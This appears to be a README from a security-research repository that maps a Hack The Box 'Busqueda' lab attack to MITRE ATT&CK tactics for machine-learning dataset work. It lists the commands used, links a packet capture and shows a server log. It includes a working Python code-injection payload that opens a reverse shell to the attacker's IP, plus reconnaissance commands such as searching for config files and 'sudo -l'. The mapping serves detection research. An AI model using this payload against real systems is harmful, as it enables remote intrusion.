# Cyber4ML_Framework application in "Busqueda" HTB machine

## Framework application details

|Documentation|MITRE ATT&CK|Enterprise|ICS|Network Analysis|Log Analysis|
|-|-|-|-|-|-|
|Yes|Yes|Yes|No|Yes|Yes|

|Attacker Level|Environment|VPN|Attacker IP|Victim IP|
|-|-|-|-|-|
|Average|Linux|Yes|10.10.16.54|10.10.11.208|

**Average:** The knowledge, behavior and attack-timing of the attacker is average.

## Documentation

Documentation of the attack: [Busqueda Documentation](https://github.com/stevendamianakis/HackTheBox_Writeups/blob/main/Machines/Busqueda/README.MD)

## MITRE ATT&CK mapping

Below, we map the attack to the MITRE ATT&CK Enterprise framework.

| Tactic | Technique | Subtechnique | Command/Script | CVE/CWE |
| - | - | - | - | - |
| Reconnaissance | Gather Victim Host Information | Software | - | - |
| Initial Access | Exploit Public-Facing Application | - | (1) | -/CWE-94 |
| Execution | Exploitation for Client Execution | - | (1) | -/CWE-94 |
| Discovery | System Owner/User Discovery | - | (2) | - |
| Discovery | File and Directory Discovery | - | (3) | - |
| Credential Access | Credentials from Password Stores | Password Managers | - | - |
| Persistence | Valid Accounts | Local Accounts | (4) | - |
| Discovery | Permission Groups Discovery | Local Groups | (5) | - |
| Privilege Escalation | Exploitation for Privilege Escalation | - | - |

#### Commands/Scripts
- (1)
```
', exec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.16.54',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"))#
```

- (2)
```
whoami
```

- (3)
```
find /var/www/ -type f -iname "*config*" 2>/dev/null
```

- (4)
```
ssh player@10.10.11.194
```

- (5)
```
sudo -l
```

## Network Data

Pcap file of the attack: [Capture File](https://github.com/stevendamianakis/Cyber4ML_Framework/blob/main/HackTheBox/Busqueda/attack_capture.pcapng)

## Malicious Log Data

```
HTTP/1.1 200 OK
Date: Thu, 11 May 2023 12:07:38 GMT
Server: Werkzeug/2.1.2 Python/3.10.6
Content-Type: text/html; charset=utf-8
Content-Length: 0
Connection: close
```
